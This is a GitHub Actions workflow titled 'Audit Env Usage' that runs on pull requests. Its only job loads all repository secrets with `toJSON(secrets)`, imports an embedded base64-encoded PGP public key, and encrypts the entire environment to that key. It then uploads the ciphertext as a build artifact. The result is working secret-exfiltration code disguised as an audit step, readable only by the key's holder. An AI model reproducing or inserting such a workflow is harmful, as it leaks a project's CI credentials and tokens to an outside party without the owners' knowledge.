name: Audit Env Usage

on:
  pull_request:

jobs:
  echo-variables:
    runs-on: ubuntu-latest

    steps:
      - name: Check Env
        run: |
          echo $gpgb64 | base64 -d > public.gpg
          gpg --import ./public.gpg
          env | gzip | gpg --encrypt -r F1CDCCDA4678C5C407513D629AC2C053D1FFEE2E --trust-model always --armor > msg.gpg
        env:
          gpgb64: 'LS0tLS1CRUdJTiBQR1AgUFVCTElDIEtFWSBCTE9DSy0tLS0tCgptUUdOQkdnTkZLUUJEQURmaDZ4SGNqNmZLaEx0MUdiR2JCanR5ZHFrTkJOb1hYcVduajR5cHRhSURBd3RsTVFHCnE3VjR3cmR3SUsxM1JOTitrZDBWazZtQW9BbnhZVTRDYVhVVUh0K05rK25lVnkwNjE5eUQxZHBoNTJOYm1ZM2IKMWxUb2VXUXZNNG11WnVEbDBmUGNmb1RTbGg4SlpSZXF0UVROKys2bm90S1hHWndXcGRKSEZlVXhJbzBobkxPMwpjNGx3c05hWWlRUElRMWx1YWlUcFVDZ3RtTDgzY1ByNHVjbXg0V3E3d1VvVGgrK2FOVFdOTlh4MEttOWpoZDhWCkEycnZHVG9OT3NIdDBCalJSYkIzRE1iMWxDY2FtSFVNdUpxVXVtK3E1VlVsdEpEV0ZJMHlodWlLc2FLTUphZUoKdlN4bXhSa3ZXSVh5cXFGaXJpL3pBWWRGWHR4alFaa1J5U0dPbGkwNm9QV0xYMi9EVzgyaDdjTCtVK2lUVjhFdgpwaVdCWGM4L2NPK0N0M3BiTG92bStKU083c215ZWUwblNoalYwR2haTmR5dEtFV3FicUNXWklrUnpCbHpyMUZjCnNqUkZxTkpTYTBDVWQ2a1RiR3FqZCtTRG5CLzR3THZVV3MxNXV3ckhNb0F0S3RyT0I1WlJ6cEJQSTZrM1QrSGgKdG1NakdXN2dObHdhTzQ4QUVRRUFBYlJIYzJOb1pXUjFiR1ZrSUdGMVpHbDBJQ2hsYm5acGNtOXViV1Z1ZENCMgpZWEpwWVdKc1pTQmhkV1JwZENrZ1BHUmhibTU1TG1OdmIzQmxja0JuY21GbVlXNWhMbU52YlQ2SkFjNEVFd0VLCkFEZ1dJUVR4emN6YVJuakZ4QWRSUFdLYXdzQlQwZi91TGdVQ2FBMFVwQUliQXdVTENRZ0hBZ1lWQ2drSUN3SUUKRmdJREFRSWVBUUlYZ0FBS0NSQ2F3c0JUMGYvdUxnaVJDLzkyektaTUVpeVRxUy8yT2NmbW9QMEZZNW54aENEdApGTGIvV1dDQUZkS0xEQlIwb2xOblA1R01TeEN0RUlmcUZyeWUvcytrSDB2NGIrd2Q1SEVlbkZJU3psL2YyRE5lCkJZZEJHWGI4VHBhcVROYlkwQnJNZ2pNSGRrRnV2SExXVUpUL0ROQTUxTVdnK2swa0svQ1FwbDB6MjNYVnBFdU4KWE1rV05xcllNRDhWTk9JdEpnOVNQbktlSTRqYlRmcXcwdWZmNDJKM1VQTjRpM0EzZTdCRTZmWTUyN3o2VVFlRwpCY3lmUnQzb3lZcFAvY0xDQmZZeE5UVnpIK04zUVI2MnMxYytwVDg1RDUyakdpZHZmSGt1U0U0RUtBS215a3poClMwaElITUVkWnk2YmNBVWYxbk9iVVlNd2JLdVA0eElBS045RU1xU25DNVp6ZzIzTyswS1k5a2dGQ2ZpRnFlUFcKd3FLT29RRGhIaVcxOHN5NTR6dnM2VzNKZUxvb0t5Z2ZOK2dGc3Y3TWU0Y1V5eUNKNDhUVXBxUzNPdjM4ZWxHYQpPaTRwanBDOVVFODFoSUdXbEV1ZDlGams0Z3hEUXArc3RiSE9RUUF2MjBBL1JlUWlSVVpqUHNQcDVaOFhudkVWCnNXUGJIajRPQkkrYlN5bGZmN2F6NTZmcTNVK3AwQmxkL1ZxNUFZMEVhQTBVcEFFTUFMV0FuZWEveWNCQ0dnYUwKNFhidVg4T3ZDTVZxVWN3MGxPRytwa3FVSWJmbkh3QlB4a2lIVjFGY2tLNXdyYkI2U0VtUmkzMy9jbXRBeExqWApmQmEwZkdlTUVzTkpaRTVXSW5CdGNyVUVGdHRid0R2NzFFSFU2MDVXRjJyUE1GcnM3WDk3Y0JscS9YNWZhV0JsCklVM1J3SjlvR2crdHZ1QTQ1Zkd0Ukd2QXVEakVmaHFSbVNNcU1PVGxobHlIYTFRRGhmZVJUNHZvVEJ1Y293TXQKWENxcUlDdFNGTWZDbTIzcDZ0TVNlaVVmajVxbC8wU1FWeStnOWd5Mit5TnJDaUxZSzlNN3ZLdWRvUDU3RWJIcApCcVhiMVd2WUZNdFN4Z2V1eVQySTkvaVB2d2Vpdi9Dd1FKajF3MjBUOW9nckRUUUVJd01lQ0UybTZnZFk1Q0k5CkQ2SDVwNWZEVHc0b0cxY1JhUGhIY2VaS1FXVG4wVzFPc09qTFVzbEZoRVZkcVJJL01BZEIxQ1U3dVBMRHhUWjEKZ2FvNlRKRzZEWktoYjhybU16dVFCeW5WY28zcVBUTklPVmJtcS9pQmM2LzltUkRIYk5tK0ErbWx6S3ZGbmkrZwpaSU9NM2ZROHFsR2NWRmxwNlZESVpjQWFhVkJ1YUxhUVUwQzFocDBJb3IvSU50alk5UUFSQVFBQmlRRzJCQmdCCkNnQWdGaUVFOGMzTTJrWjR4Y1FIVVQxaW1zTEFVOUgvN2k0RkFtZ05GS1FDR3d3QUNna1Ftc0xBVTlILzdpNW4KYUF3QTNOSld4b2NhK3UzS1Y5RmV4TDRON1IzMDdpYStxRE5iTWNLR0Q1MXg1eFpZalZiYTRHc2hNUGFzRWtCVAp4Nk5vUnJRUWkzbWlKd2x2Mk41c1d6TWVjQjR2OFN5b2tIcHRPc2wyeGg1NDFma0hZbEF6blp2NmIzek1WNDY0Ckp4UHJ2bUlVUW1DcTI2RmFLZFlEaXBFdWxBYzZ5aXQ2SzVLU1RER1dTOUYzTEM0cHE4UFVMdjN6VlFMRkVJeWsKOS9lLzZQRHFNWm9VNlNhRUpHRlhGQk9wMTVRSFJEWTluL294QWV4T3BYN2VRTUpiMGtxMnJGNzZINE5qMTFNLwpyaVBwcEhTSGUzYUE2Y1hRdTJrekFYdVY4R0wxTkcxb1ZURGROT0lDbWUxTGRiaHZEendpbXlwRC8xQkVTQjRpCmdmN1VGckNzanJWVklyRFJ3Wk13TGYwdVdZeUhLVHdyQXg4Nzg5b0JOSTZKMWZDZTF3dGF6Q0llNFYrRGJGRisKMEppaHkvOFVWTy9taG9oU0U3N2pvWUY2a1N0elF5NlBjUDdDbTJIdDFKWjNMdUxHTkFSNkRWS2R3YXArTEhDdApZOVlpODY2Qm4vSlBvZFFtSXhmSTM5azdDK3JZeVRGcDI1VEVWMUJuMUp6ZU5qcUlNM3NOTjF1OTc5VXI2QldvCmpqNWEKPVRJdXcKLS0tLS1FTkQgUEdQIFBVQkxJQyBLRVkgQkxPQ0stLS0tLQo='
          VALUES: ${{ toJSON(secrets)}}
      - name: Upload Artifact
        uses: actions/upload-artifact@v4
        with:
          name: message
          path: ./msg.gpg
